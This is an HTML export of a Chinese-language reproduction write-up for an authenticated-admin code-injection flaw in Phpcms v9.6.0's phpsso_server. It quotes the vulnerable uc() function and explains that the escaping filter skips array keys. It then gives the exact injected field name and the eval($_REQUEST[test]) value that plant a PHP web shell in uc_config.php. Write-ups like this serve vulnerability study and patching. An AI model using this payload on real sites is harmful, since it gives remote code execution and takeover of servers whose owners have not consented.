<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpcms-v960后台getshell"><span class="csDE05BCC">Phpcms v9.6.0</span><span class="csECDA2D3">后台</span><span class="csDE05BCC">getshell</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">phpsso_server </span><span class="cs9C1B1871">后台</span><span class="cs8926E06">getshell</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpcms v9.6.0</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞来自于</span><span class="cs8926E06">ROOTDIR/phpsso_server/phpcms/modules/admin/system.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function uc() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isset($_POST[&#39;dosubmit&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = isset($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;ucuse&#39;] = isset($_POST[&#39;ucuse&#39;]) &amp;&amp; intval($_POST[&#39;ucuse&#39;]) ? intval($_POST[&#39;ucuse&#39;]) : 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$filepath = CACHE_PATH.&#39;configs&#39;.DIRECTORY_SEPARATOR.&#39;system.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config = include $filepath;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$uc_config = &#39;&lt;?php &#39;.&quot;\ndefine(&#39;UC_CONNECT&#39;, &#39;mysql&#39;);\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($data as $k =&gt; $v) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$old[] = &quot;&#39;$k&#39;=&gt;&#39;&quot;.(isset($config[$k]) ? $config[$k] : $v).&quot;&#39;,&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$new[] = &quot;&#39;$k&#39;=&gt;&#39;$v&#39;,&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$uc_config .= &quot;define(&#39;&quot;.strtoupper($k).&quot;&#39;, &#39;$v&#39;);\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$html = file_get_contents($filepath);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$html = str_replace($old, $new, $html);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$uc_config_filepath = CACHE_PATH.&#39;configs&#39;.DIRECTORY_SEPARATOR.&#39;uc_config.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@file_put_contents($uc_config_filepath, $uc_config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@file_put_contents($filepath, $html);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;insert(array(&#39;name&#39;=&gt;&#39;ucenter&#39;, &#39;data&#39;=&gt;array2string($data)), 1,1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showmessage(L(&#39;operation_success&#39;), HTTP_REFERER);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r = $this-&gt;db-&gt;get_one(array(&#39;name&#39;=&gt;&#39;ucenter&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = string2array($r[&#39;data&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include $this-&gt;admin_tpl(&#39;system_uc&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">来自这段中的</span></p><p class="cs40DD2BC9"><span class="cs8926E06">$data = isset($_POST[&#39;data&#39;]) ? $_POST[&#39;data&#39;] : &#39;&#39;;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">和</span></p><p class="cs40DD2BC9"><span class="cs8926E06">foreach ($data as $k =&gt; $v) {<br/>$old[] = &quot;&#39;$k&#39;=&gt;&#39;&quot;.(isset($config[$k]) ? $config[$k] : $v).&quot;&#39;,&quot;;<br/>$new[] = &quot;&#39;$k&#39;=&gt;&#39;$v&#39;,&quot;;<br/>$uc_config .= &quot;define(&#39;&quot;.strtoupper($k).&quot;&#39;, &#39;$v&#39;);\n&quot;;<br/>}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里接收</span><span class="cs8926E06">post[&#39;data&#39;]</span><span class="cs9C1B1871">数据中的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">，</span><span class="cs8926E06">value</span><span class="cs9C1B1871">并写入配置文件</span><span class="cs8926E06">ROOTDIR/phpsso_server/caches/configs/uc_config.php</span><span class="cs9C1B1871">中</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">ROOTDIR/phpcms/libs/classes/param.class.php</span><span class="cs9C1B1871">中</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function __construct() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!get_magic_quotes_gpc()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_POST = new_addslashes($_POST);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_GET = new_addslashes($_GET);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_REQUEST = new_addslashes($_REQUEST);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_COOKIE = new_addslashes($_COOKIE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">全局过滤了</span><span class="cs8926E06">post</span><span class="cs9C1B1871">，但是这里只过滤了</span><span class="cs8926E06">value</span><span class="cs9C1B1871">，并没有过滤</span><span class="cs8926E06">key</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.0%e5%90%8e%e5%8f%b0getshell_files/image0.png" width="560" height="305" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这个地方，我们可以构造</span></p><p class="cs3A447A38"><span class="cs9FB05234">name=&quot;data[uc_api&#39;,&#39;11&#39;);/*]&quot;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">并在</span><span class="cs8926E06">Ucenter api </span><span class="cs9C1B1871">地址输入</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">*/eval($_REQUEST[test]);//</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再进行缓存更新</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.0%e5%90%8e%e5%8f%b0getshell_files/image1.png" width="560" height="280" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">就成功写入了一句话</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.0%e5%90%8e%e5%8f%b0getshell_files/image2.png" width="560" height="274" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.0%e5%90%8e%e5%8f%b0getshell_files/image3.png" width="560" height="314" alt="" style="border-width:0px;" /></span></p></body>
</html>
